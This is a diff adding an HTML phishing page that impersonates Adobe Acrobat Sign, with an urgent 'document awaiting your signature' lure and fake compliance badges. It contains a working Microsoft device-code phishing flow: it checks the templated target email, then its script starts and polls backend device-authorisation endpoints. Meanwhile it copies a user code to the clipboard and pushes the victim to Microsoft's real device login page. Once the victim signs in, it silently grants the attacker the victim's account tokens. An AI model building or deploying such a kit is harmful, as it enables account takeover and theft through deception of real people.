@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Adobe Acrobat Sign — Document Ready for Signature</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{overflow-x:hidden;font-family:'Inter','Segoe UI',Arial,sans-serif;background:#1e1e1e;min-height:100vh;color:#f0f0f0}
+
+/* ── TOP BAR ── */
+.topbar{background:#2b2b2b;border-bottom:1px solid #3a3a3a;height:50px;display:flex;align-items:center;padding:0 24px;gap:14px;position:sticky;top:0;z-index:10}
+/* CSS Adobe A-flag logo */
+.adobe-flag{width:28px;height:28px;background:#FA0F00;border-radius:3px;position:relative;flex-shrink:0}
+.adobe-flag::before{content:'';position:absolute;left:50%;top:6px;transform:translateX(-50%);width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-bottom:16px solid white}
+.adobe-flag::after{content:'';position:absolute;left:50%;top:16px;transform:translateX(-50%);width:8px;height:2px;background:#FA0F00}
+.topbar-title{font-size:15px;font-weight:600;color:#f0f0f0}
+.topbar-pipe{width:1px;height:16px;background:#4a4a4a}
+.topbar-sub{font-size:12px;color:#888}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.top-sign-btn{background:#FA0F00;color:#fff;border:none;border-radius:4px;padding:7px 18px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
+
+/* ── MAIN CONTENT ── */
+.page-wrap{max-width:900px;margin:0 auto;padding:28px 16px 40px;width:100%}
+
+/* Document card */
+.doc-card{background:#2b2b2b;border-radius:8px;padding:0 0 28px;overflow:hidden;margin-bottom:22px;border:1px solid #3a3a3a}
+.doc-card-header{background:#FA0F00;padding:18px 24px;display:flex;align-items:center;gap:14px}
+.dch-icon{width:40px;height:48px;background:rgba(255,255,255,.15);border-radius:3px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;flex-shrink:0}
+.dch-icon span{width:24px;height:2.5px;background:rgba(255,255,255,.8);border-radius:1px;display:block}
+.dch-info h2{font-size:17px;font-weight:700;color:#fff;margin-bottom:3px}
+.dch-info p{font-size:12px;color:rgba(255,255,255,.75)}
+.status-pill{margin-left:auto;background:rgba(255,255,255,.15);color:#fff;border-radius:20px;padding:4px 14px;font-size:11px;font-weight:700;white-space:nowrap;border:1px solid rgba(255,255,255,.2)}
+.doc-body{padding:22px 24px 0}
+.meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:22px}
+.meta-item{background:#232323;border-radius:6px;padding:12px 14px}
+.meta-label{font-size:10px;color:#666;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.meta-val{font-size:13px;font-weight:600;color:#e0e0e0}
+
+/* PDF Viewer card */
+.viewer-card{background:#1a1a1a;border-radius:6px;overflow:hidden;margin-bottom:22px;border:1px solid #3a3a3a}
+.vc-toolbar{background:#2b2b2b;padding:10px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #3a3a3a}
+.vc-tool{width:26px;height:26px;background:#3a3a3a;border-radius:4px;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.vc-title{font-size:12px;color:#888;margin-left:6px;flex:1}
+.vc-page{font-size:12px;color:#666}
+/* CSS PDF page block */
+.pdf-page{padding:20px 24px;display:flex;gap:20px;align-items:flex-start}
+.pdf-thumb{width:120px;background:#fff;border-radius:2px;padding:14px 10px;flex-shrink:0;box-shadow:0 4px 16px rgba(0,0,0,.5)}
+.pt-line{height:3px;background:#e0e0e0;border-radius:1px;margin-bottom:5px}
+.pt-line.dark{background:#999}
+.pt-line.short{width:60%}
+.pt-line.med{width:80%}
+.pt-sign-block{position:relative;height:32px;border:1.5px dashed #FA0F00;border-radius:2px;margin-top:10px;background:rgba(250,15,0,.04);display:flex;align-items:center;justify-content:center}
+.pt-sign-label{font-size:8px;color:#FA0F00;font-weight:600}
+.pdf-excerpt{flex:1}
+.pe-title{font-size:14px;font-weight:700;color:#e0e0e0;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #333}
+.pe-line{height:10px;background:#333;border-radius:3px;margin-bottom:8px}
+.pe-line.short{width:55%}
+.pe-line.med{width:75%}
+.pe-locked{display:flex;align-items:center;gap:8px;background:#2b2b2b;border:1px dashed #FA0F00;border-radius:4px;padding:10px 12px;font-size:12px;color:#FA0F00;margin-top:14px}
+
+/* Signing steps */
+.steps-row{display:flex;gap:0;border:1px solid #3a3a3a;border-radius:6px;overflow:hidden;margin-bottom:22px}
+.step-item{flex:1;padding:14px 10px;text-align:center;border-right:1px solid #3a3a3a;background:#232323}
+.step-item:last-child{border-right:none}
+.si-num{width:28px;height:28px;border-radius:50%;margin:0 auto 6px;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}
+.si-num.done{background:#22863a;color:#fff}
+.si-num.active{background:#FA0F00;color:#fff}
+.si-num.pending{background:#333;color:#666}
+.si-label{font-size:11px;color:#888;line-height:1.4}
+.si-label.active{color:#FA0F00;font-weight:600}
+
+/* CTA bottom -->
+.cta-bottom{background:#2b2b2b;border:1px solid #3a3a3a;border-radius:8px;padding:22px 24px;display:flex;align-items:center;gap:20px}
+.cta-left{flex:1}
+.cta-left h3{font-size:16px;font-weight:700;color:#f0f0f0;margin-bottom:4px}
+.cta-left p{font-size:13px;color:#888}
+.cta-btns-group{display:flex;gap:10px;flex-shrink:0}
+.btn-sign{background:#FA0F00;color:#fff;border:none;border-radius:4px;padding:13px 28px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:8px;box-shadow:0 4px 14px rgba(250,15,0,.35)}
+.btn-sign:hover{background:#d10d00}
+.btn-delegate{background:transparent;color:#FA0F00;border:1.5px solid #FA0F00;border-radius:4px;padding:12px 20px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
+
+/* Trust strip -->
+.trust-strip{display:flex;align-items:center;justify-content:center;gap:28px;padding:18px;margin-top:22px;flex-wrap:wrap}
+.ts-item{display:flex;align-items:center;gap:6px;font-size:11px;color:#666}
+
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.85);backdrop-filter:blur(4px);align-items:center;justify-content:center}
+.auth-box{background:#2b2b2b;border:1px solid #3a3a3a;border-radius:8px;padding:32px 28px;max-width:390px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6)}
+/* Email gate */
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.85);backdrop-filter:blur(8px)}
+.gate-box{background:#2b2b2b;border:1px solid #FA0F00;border-radius:8px;padding:36px 28px;width:90%;max-width:380px;text-align:center}
+.gate-input{width:100%;padding:12px 14px;background:#1e1e1e;border:1.5px solid #3a3a3a;border-radius:4px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;color:#e0e0e0;transition:border .15s}
+.gate-input:focus{border-color:#FA0F00}
+.gate-input::placeholder{color:#555}
+.gate-btn{width:100%;background:#FA0F00;color:#fff;border:none;border-radius:4px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-err{color:#f85149;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style>
+</head>
+<body>
+
+<!-- Adobe header bar -->
+<div class="topbar">
+  <div class="adobe-flag"></div>
+  <span class="topbar-title">Adobe Acrobat Sign</span>
+  <div class="topbar-pipe"></div>
+  <span class="topbar-sub">e-Signature Platform</span>
+  <div class="topbar-right">
+    <span style="font-size:12px;color:#888">Need help?</span>
+    <button class="top-sign-btn" onclick="startAuth()">Sign Now →</button>
+  </div>
+</div>
+
+<div class="page-wrap">
+  <!-- Document card -->
+  <div class="doc-card">
+    <div class="doc-card-header">
+      <div class="dch-icon">
+        <span></span><span></span><span></span><span class="short"></span>
+      </div>
+      <div class="dch-info">
+        <h2>Contract_Agreement_2026.pdf</h2>
+        <p>Sent via Adobe Acrobat Sign · 4 pages · 2 signature fields</p>
+      </div>
+      <span class="status-pill">⏳ AWAITING YOUR SIGNATURE</span>
+    </div>
+    <div class="doc-body">
+      <div class="meta-grid">
+        <div class="meta-item"><div class="meta-label">Document Sent</div><div class="meta-val"><span class="dyn-date"></span> · <span class="dyn-time"></span></div></div>
+        <div class="meta-item"><div class="meta-label">Expires</div><div class="meta-val" style="color:#FA0F00"><span class="dyn-date-plus7"></span> · 7 days</div></div>
+        <div class="meta-item"><div class="meta-label">Sender</div><div class="meta-val">Adobe Acrobat Sign System</div></div>
+        <div class="meta-item"><div class="meta-label">Reference</div><div class="meta-val">AAS-2026-031841</div></div>
+      </div>
+
+      <!-- PDF viewer mock -->
+      <div class="viewer-card">
+        <div class="vc-toolbar">
+          <div class="vc-tool"><svg width="12" height="12" viewBox="0 0 24 24" fill="#888"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></div>
+          <div class="vc-tool"><svg width="12" height="12" viewBox="0 0 24 24" fill="#888"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm7 13H5v-.23c0-.62.28-1.2.76-1.58C7.47 15.82 9.64 15 12 15s4.53.82 6.24 2.19c.48.38.76.97.76 1.58V19z"/></svg></div>
+          <span class="vc-title">Contract_Agreement_2026.pdf — Sign to proceed</span>
+          <span class="vc-page">Page 1 of 4</span>
+        </div>
+        <div class="pdf-page">
+          <div class="pdf-thumb">
+            <div class="pt-line dark"></div>
+            <div class="pt-line dark med"></div>
+            <div style="height:6px"></div>
+            <div class="pt-line"></div><div class="pt-line short"></div>
+            <div class="pt-line"></div><div class="pt-line med"></div>
+            <div class="pt-line"></div><div class="pt-line short"></div>
+            <div class="pt-line"></div><div class="pt-line"></div>
+            <div class="pt-sign-block"><span class="pt-sign-label">SIGN HERE</span></div>
+          </div>
+          <div class="pdf-excerpt">
+            <div class="pe-title">Contract_Agreement_2026.pdf</div>
+            <div class="pe-line"></div><div class="pe-line med"></div><div class="pe-line"></div>
+            <div class="pe-line short"></div><div class="pe-line"></div><div class="pe-line med"></div>
+            <div class="pe-line short"></div><div class="pe-line"></div>
+            <div class="pe-locked">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="#FA0F00"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
+              Document is locked. Sign in with Microsoft to unlock and view.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Steps -->
+      <div class="steps-row">
+        <div class="step-item"><div class="si-num done"><svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div><div class="si-label">Document created</div></div>
+        <div class="step-item"><div class="si-num done"><svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div><div class="si-label">Sent to recipients</div></div>
+        <div class="step-item"><div class="si-num active">3</div><div class="si-label active">Verify Identity</div></div>
+        <div class="step-item"><div class="si-num pending">4</div><div class="si-label">Sign document</div></div>
+        <div class="step-item"><div class="si-num pending">5</div><div class="si-label">Completed</div></div>
+      </div>
+
+      <!-- CTA -->
+      <div class="cta-bottom">
+        <div class="cta-left">
+          <h3>Ready to sign?</h3>
+          <p>Verify your Microsoft identity to unlock and sign this document</p>
+        </div>
+        <div class="cta-btns-group">
+          <button class="btn-delegate">Decline</button>
+          <button class="btn-sign" onclick="startAuth()">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+            Sign with Microsoft
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Trust strip -->
+  <div class="trust-strip">
+    <div class="ts-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#666"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>ESIGN Act Compliant</div>
+    <div class="ts-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#666"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>UETA Compliant</div>
+    <div class="ts-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#666"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>ISO 27001</div>
+    <div class="ts-item"><svg width="14" height="14" viewBox="0 0 24 24" fill="#666"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>256-bit Encrypted</div>
+  </div>
+  <p style="text-align:center;font-size:11px;color:#555;margin-top:8px">© 2026 Adobe Inc. · 345 Park Avenue, San Jose, CA 95110 · <a href="#" style="color:#FA0F00">Privacy</a> · <a href="#" style="color:#FA0F00">Terms</a></p>
+</div>
+
+<!-- Auth overlay -->
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:15px;font-weight:300;color:#e0e0e0">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#f0f0f0;margin-bottom:6px">Verify your identity</h3>
+    <p id="auth-sub" style="font-size:13px;color:#888;margin-bottom:22px;line-height:1.6">Adobe Acrobat Sign uses your Microsoft account to verify your identity before allowing document access.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #3a3a3a;border-top-color:#FA0F00;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px"></div><p style="font-size:13px;color:#666">Connecting…</p></div>
+        <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#fff;font-family:monospace;background:rgba(0,0,0,.2);border-radius:6px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed rgba(255,255,255,.2)" onclick="openLogin()"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:8px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#FA0F00;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.3)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+      <div id="ok-sec" style="display:none">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="#3fb950" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:15px;font-weight:700;color:#3fb950">Verified</p>
+      <p style="font-size:13px;color:#666;margin-top:4px">Unlocking document…</p>
+    </div>
+  </div>
+</div>
+
+<!-- Email gate -->
+<div id="email-gate">
+  <div class="gate-box">
+    <div class="adobe-flag" style="width:36px;height:36px;margin:0 auto 16px"></div>
+    <p style="font-size:17px;font-weight:700;color:#f0f0f0;margin-bottom:6px">Confirm Recipient Email</p>
+    <p style="font-size:13px;color:#888;margin-bottom:20px;line-height:1.6">This signing request was emailed to you. Enter the work email address where you received it to unlock and sign the document.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ Email not recognised. Enter the email address this request was sent to.</div>
+    <button class="gate-btn" onclick="gv()">Continue to Sign →</button>
+    <p style="font-size:11px;color:#444;margin-top:12px">🔒 Adobe Acrobat Sign · Secured</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#FA0F00';i.style.animation='sh .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code||d.userCode;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://acrobat.adobe.com',2500);}}).catch(()=>{});},( d.interval||5)*1000);}).catch(()=>location.reload());}
+
+function openLogin(){
+  cpCode();
+  const url='https://microsoft.com/devicelogin';
+  const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');
+  if(!w||w.closed||typeof w.closed==='undefined'){
+    // Popup blocked — fall back to redirect in same tab after short delay
+    const btn=document.getElementById('open-btn');
+    if(btn){btn.textContent='⏎ Redirecting…';}
+    setTimeout(()=>window.location.href=url,800);
+  }
+}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script>
+<script>
+// Dynamic date injection — replaces all .dyn-date and .dyn-date-plus7 elements on load
+(function(){
+  const now=new Date();
+  const fmt=(d)=>d.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
+  const fmtShort=(d)=>d.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
+  const plus7=new Date(now);plus7.setDate(plus7.getDate()+7);
+  const plus14=new Date(now);plus14.setDate(plus14.getDate()+14);
+  const timeStr=now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false})+' UTC';
+  document.querySelectorAll('.dyn-date').forEach(el=>el.textContent=fmt(now));
+  document.querySelectorAll('.dyn-date-short').forEach(el=>el.textContent=fmtShort(now));
+  document.querySelectorAll('.dyn-date-plus7').forEach(el=>el.textContent=fmtShort(plus7));
+  document.querySelectorAll('.dyn-date-plus14').forEach(el=>el.textContent=fmtShort(plus14));
+  document.querySelectorAll('.dyn-time').forEach(el=>el.textContent=timeStr);
+  document.querySelectorAll('.dyn-year').forEach(el=>el.textContent=now.getFullYear());
+})();
+</script>
+</body></html>
